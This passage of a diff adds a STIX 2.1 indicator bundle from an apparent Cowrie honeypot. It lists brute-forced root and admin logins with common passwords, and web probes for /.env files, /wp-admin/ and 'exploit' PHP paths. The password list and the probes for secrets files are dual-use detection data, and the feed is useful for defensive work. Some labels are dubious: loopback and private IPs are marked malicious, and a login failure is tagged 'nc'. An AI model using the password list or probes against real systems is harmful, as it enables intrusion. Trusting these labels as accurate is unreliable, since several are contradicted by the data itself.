@@ -1,0 +1,1906 @@
+{
+  "type": "bundle",
+  "id": "bundle--366f8864-3a97-4a5e-b311-22acd3f1a67b",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "identity",
+      "id": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "created": "2025-12-04T12:39:48.164Z",
+      "modified": "2025-12-04T12:39:48.164Z",
+      "name": "Cowrie Honeypot System",
+      "identity_class": "system",
+      "description": "Automated honeypot for capturing SSH/Telnet attacks and web intrusions"
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--bd7617ec-43f1-4cc2-a56b-72f95af26295",
+      "created": "2025-12-03T16:59:28.615Z",
+      "modified": "2025-12-04T12:38:33.714Z",
+      "name": "IP: 192.168.1.78",
+      "description": "Private IP (Class C Private) - possible misconfiguration",
+      "pattern": "[ipv4-addr:value = '192.168.1.78']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.615Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1273,
+      "x_sid": 1000003
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--b48599c8-ef80-4e91-8f6b-b6db6861bba8",
+      "created": "2025-12-03T16:59:28.952Z",
+      "modified": "2025-12-04T12:38:33.697Z",
+      "name": "PASSWORD: password",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'password']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.952Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 16,
+      "x_sid": 1000009
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--20ee676d-215e-44fe-8e83-deed187ed407",
+      "created": "2025-12-03T16:59:28.589Z",
+      "modified": "2025-12-04T12:38:33.693Z",
+      "name": "USERNAME: root",
+      "description": "Privilege escalation attempt on root (182 tries)",
+      "pattern": "[user-account:account_login = 'root']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.589Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 182,
+      "x_sid": 1000001
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--396e450b-2ff1-4e91-9778-252b69ce9f36",
+      "created": "2025-12-03T16:59:28.896Z",
+      "modified": "2025-12-04T12:38:33.684Z",
+      "name": "PASSWORD: 12345678",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '12345678']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.896Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 16,
+      "x_sid": 1000005
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--b6df6c24-c294-4bdd-8856-8830f4e93a29",
+      "created": "2025-12-04T12:36:05.006Z",
+      "modified": "2025-12-04T12:38:33.671Z",
+      "name": "PASSWORD: qwerty",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'qwerty']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.006Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 6,
+      "x_sid": 1000080
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--876b7f2e-89b6-4892-a770-06e9bf492f7b",
+      "created": "2025-12-03T16:59:28.938Z",
+      "modified": "2025-12-04T12:38:33.658Z",
+      "name": "PASSWORD: 123456",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '123456']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.938Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 18,
+      "x_sid": 1000008
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--3aac2559-5c3e-4b17-abf8-c779cc111b62",
+      "created": "2025-12-04T12:36:06.520Z",
+      "modified": "2025-12-04T12:36:06.520Z",
+      "name": "PASSWORD: 12345699",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '12345699']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:06.520Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 1,
+      "x_sid": 1000089
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--bb0b5c50-b19e-4174-aa9d-a3a248badcbb",
+      "created": "2025-12-03T16:59:28.593Z",
+      "modified": "2025-12-04T12:36:06.450Z",
+      "name": "PASSWORD: 1234",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '1234']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.593Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 14,
+      "x_sid": 1000002
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7e1466c6-8725-4f91-ae0d-1b9efe754dbe",
+      "created": "2025-12-04T12:36:06.377Z",
+      "modified": "2025-12-04T12:36:06.436Z",
+      "name": "PASSWORD: root",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'root']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:06.377Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000088
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--0d6159ee-1152-4671-84aa-83a7fe539e5d",
+      "created": "2025-12-03T16:59:29.024Z",
+      "modified": "2025-12-04T12:36:06.332Z",
+      "name": "PASSWORD: nicole",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'nicole']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.024Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000014
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--d39ce7b1-c01d-4164-99e6-c44c291864f1",
+      "created": "2025-12-03T16:59:29.099Z",
+      "modified": "2025-12-04T12:36:06.318Z",
+      "name": "PASSWORD: jessica",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'jessica']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.099Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000019
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--5b1fc20e-0ba9-4eb3-958d-021b32a3a3c8",
+      "created": "2025-12-03T16:59:29.082Z",
+      "modified": "2025-12-04T12:36:06.305Z",
+      "name": "PASSWORD: babygirl",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'babygirl']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.082Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000018
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7a917abc-f459-4bb7-8a15-20e3a539a595",
+      "created": "2025-12-03T16:59:29.114Z",
+      "modified": "2025-12-04T12:36:06.293Z",
+      "name": "PASSWORD: monkey",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'monkey']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.114Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000020
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--768ba648-635c-450f-afbe-1e1c26a7677c",
+      "created": "2025-12-03T16:59:29.068Z",
+      "modified": "2025-12-04T12:36:06.280Z",
+      "name": "PASSWORD: lovely",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'lovely']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.068Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000017
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e05f3c7d-b8e3-4211-b7cc-4b2f1f8a97ba",
+      "created": "2025-12-03T16:59:28.993Z",
+      "modified": "2025-12-04T12:36:06.268Z",
+      "name": "COMMAND: login attempt [root/princess] failed",
+      "description": "nc",
+      "pattern": "[process:command_line = 'login attempt [root/princess] failed']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.993Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 9,
+      "x_sid": 1000012
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--66524b53-e16b-4fb2-ba53-478e855e80f6",
+      "created": "2025-12-03T16:59:28.987Z",
+      "modified": "2025-12-04T12:36:06.263Z",
+      "name": "PASSWORD: princess",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'princess']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.987Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000011
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--6313c5ac-335b-4ae6-9a94-07a12b5a4198",
+      "created": "2025-12-03T16:59:32.022Z",
+      "modified": "2025-12-04T12:36:06.251Z",
+      "name": "PASSWORD: admin",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'admin']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:32.022Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 5,
+      "x_sid": 1000036
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e01cde8d-4b5c-46eb-9049-e20b5b4f08a8",
+      "created": "2025-12-04T12:36:05.150Z",
+      "modified": "2025-12-04T12:36:06.238Z",
+      "name": "PASSWORD: 000000",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '000000']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.150Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000087
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--40e72864-6a42-4237-ba5a-afce6f832822",
+      "created": "2025-12-04T12:36:05.136Z",
+      "modified": "2025-12-04T12:36:06.226Z",
+      "name": "PASSWORD: 1234567890",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '1234567890']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.136Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000086
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--ce1fd6c1-05c3-4d16-8857-6c7c4f681be6",
+      "created": "2025-12-04T12:36:05.124Z",
+      "modified": "2025-12-04T12:36:06.213Z",
+      "name": "PASSWORD: trustnol",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'trustnol']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.124Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000085
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--616cee1c-5b8b-411e-b801-adb4b4555140",
+      "created": "2025-12-03T16:59:28.910Z",
+      "modified": "2025-12-04T12:36:06.200Z",
+      "name": "PASSWORD: iloveyou",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'iloveyou']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.910Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000006
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--1c4887eb-0d11-42b1-b1fc-86f881d46bfd",
+      "created": "2025-12-04T12:36:05.099Z",
+      "modified": "2025-12-04T12:36:06.185Z",
+      "name": "PASSWORD: baseball",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'baseball']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.099Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000084
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7fe9e743-5181-4375-8f67-f4a245b211af",
+      "created": "2025-12-04T12:36:05.086Z",
+      "modified": "2025-12-04T12:36:06.171Z",
+      "name": "PASSWORD: 123123",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '123123']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.086Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000083
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--cbc15dab-c452-447a-a0ec-4f7b714a2bf2",
+      "created": "2025-12-04T12:36:05.074Z",
+      "modified": "2025-12-04T12:36:06.157Z",
+      "name": "PASSWORD: dragon",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'dragon']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.074Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000082
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--5bca8ba1-d342-4d9b-a907-7e9ed25b25a7",
+      "created": "2025-12-03T16:59:29.009Z",
+      "modified": "2025-12-04T12:36:06.144Z",
+      "name": "PASSWORD: 1234567",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '1234567']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:29.009Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 13,
+      "x_sid": 1000013
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7d8e958f-2527-4bd5-a1cd-1fbdc50371f7",
+      "created": "2025-12-04T12:36:05.048Z",
+      "modified": "2025-12-04T12:36:06.130Z",
+      "name": "PASSWORD: 111111",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '111111']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:05.048Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000081
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--22d4f514-ad1b-4e99-bd02-8adc0c0ca665",
+      "created": "2025-12-03T16:59:28.877Z",
+      "modified": "2025-12-04T12:36:06.101Z",
+      "name": "PASSWORD: 12345",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '12345']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.877Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 14,
+      "x_sid": 1000004
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--21775845-46e0-4221-be9a-3d113ccb4e21",
+      "created": "2025-12-03T16:59:30.439Z",
+      "modified": "2025-12-04T12:36:05.533Z",
+      "name": "USERNAME: admin",
+      "description": "Privilege escalation attempt on admin (76 tries)",
+      "pattern": "[user-account:account_login = 'admin']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:30.439Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 76,
+      "x_sid": 1000021
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--cf1f5f21-8718-4de5-ab04-44542b5556e4",
+      "created": "2025-12-04T12:36:04.905Z",
+      "modified": "2025-12-04T12:36:04.905Z",
+      "name": "PASSWORD: 12",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '12']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:04.905Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 1,
+      "x_sid": 1000079
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--6d932fc6-28b9-4ec6-97e3-3ddf4c65da47",
+      "created": "2025-12-04T12:36:04.878Z",
+      "modified": "2025-12-04T12:36:04.878Z",
+      "name": "PASSWORD: 123",
+      "description": "user:root",
+      "pattern": "[user-account:credential = '123']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:04.878Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 1,
+      "x_sid": 1000078
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--90ad4843-4a86-45b5-ae4f-b582faa95df7",
+      "created": "2025-12-03T16:59:31.994Z",
+      "modified": "2025-12-04T12:36:04.822Z",
+      "name": "PASSWORD: ola",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'ola']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:31.994Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 3,
+      "x_sid": 1000034
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--cfd6e178-29e8-44d5-9d80-a485819afd4d",
+      "created": "2025-12-04T12:36:04.810Z",
+      "modified": "2025-12-04T12:36:04.810Z",
+      "name": "PASSWORD: please",
+      "description": "user:root",
+      "pattern": "[user-account:credential = 'please']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T12:36:04.810Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "compromised-credential"
+      ],
+      "x_count": 1,
+      "x_sid": 1000077
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--2371f39b-98f0-45f1-8d89-7c514c07bd0d",
+      "created": "2025-12-04T11:24:36.218Z",
+      "modified": "2025-12-04T11:56:45.975Z",
+      "name": "URL: /admin/",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T11:24:36.218Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 2,
+      "x_sid": 1000076
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--dc1950ae-706d-49da-a9c7-f0fa8811d128",
+      "created": "2025-12-03T16:59:28.571Z",
+      "modified": "2025-12-04T11:56:45.959Z",
+      "name": "IP: 127.0.0.1",
+      "description": "HTTP GET to /admin/",
+      "pattern": "[ipv4-addr:value = '127.0.0.1']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T16:59:28.571Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "cowrie"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 100,
+      "x_sid": 1000000
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--7bbf1b10-fcab-4f2f-8c4c-3cff8065ee21",
+      "created": "2025-12-03T17:27:05.389Z",
+      "modified": "2025-12-04T11:24:46.946Z",
+      "name": "URL: /wp-admin/",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/wp-admin/']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:27:05.389Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 3,
+      "x_sid": 1000041
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--610267e3-6c2e-4b92-9dba-dcaef2b368b4",
+      "created": "2025-12-04T10:44:35.879Z",
+      "modified": "2025-12-04T10:44:35.879Z",
+      "name": "URL: /exploit_1764845075.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764845075.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:44:35.879Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000075
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e9d55d98-02e2-4abb-8548-dc57d486f5af",
+      "created": "2025-12-04T10:44:34.840Z",
+      "modified": "2025-12-04T10:44:34.840Z",
+      "name": "URL: /exploit_1764845074.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764845074.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:44:34.840Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000074
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--02cfce7f-dcbe-4ec1-9305-e04cef31a088",
+      "created": "2025-12-04T10:44:33.796Z",
+      "modified": "2025-12-04T10:44:33.796Z",
+      "name": "URL: /exploit_1764845073.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764845073.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:44:33.796Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000073
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--68a4158b-11c9-4097-b265-6d0830aadeb8",
+      "created": "2025-12-04T10:33:00.943Z",
+      "modified": "2025-12-04T10:33:00.943Z",
+      "name": "URL: /admin/test",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/test']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:33:00.943Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000072
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--36368a19-0cd3-4699-9170-7007bd97d371",
+      "created": "2025-12-04T10:19:47.569Z",
+      "modified": "2025-12-04T10:19:47.569Z",
+      "name": "URL: /exploit_1764843587492535491.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764843587492535491.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:47.569Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000071
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--cacaacb1-f2f2-4880-bebc-f7c408941b99",
+      "created": "2025-12-04T10:19:47.545Z",
+      "modified": "2025-12-04T10:19:47.545Z",
+      "name": "URL: /.env_1764843587492535491",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env_1764843587492535491']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:47.545Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000070
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--e9db79dc-d157-45b8-9181-7ba7f1b60142",
+      "created": "2025-12-04T10:19:47.520Z",
+      "modified": "2025-12-04T10:19:47.520Z",
+      "name": "URL: /admin/attack_1764843587492535491",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/attack_1764843587492535491']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:47.520Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000069
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--c35edf51-9500-4c40-b39a-6d985da9ec34",
+      "created": "2025-12-04T10:19:45.481Z",
+      "modified": "2025-12-04T10:19:45.481Z",
+      "name": "URL: /exploit_1764843585410667377.php",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/exploit_1764843585410667377.php']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:45.481Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000068
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--b10321a4-6d1a-41d3-afc2-23cd3cfd3863",
+      "created": "2025-12-04T10:19:45.454Z",
+      "modified": "2025-12-04T10:19:45.454Z",
+      "name": "URL: /.env_1764843585410667377",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/.env_1764843585410667377']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:45.454Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000067
+    },
+    {
+      "type": "indicator",
+      "id": "indicator--d1e1ee5d-6581-4d48-8ef8-09cfef9b23e2",
+      "created": "2025-12-04T10:19:45.433Z",
+      "modified": "2025-12-04T10:19:45.433Z",
+      "name": "URL: /admin/attack_1764843585410667377",
+      "description": "method=GET, ua=curl/7.81.0",
+      "pattern": "[url:value = '/admin/attack_1764843585410667377']",
+      "pattern_type": "stix",
+      "valid_from": "2025-12-04T10:19:45.433Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
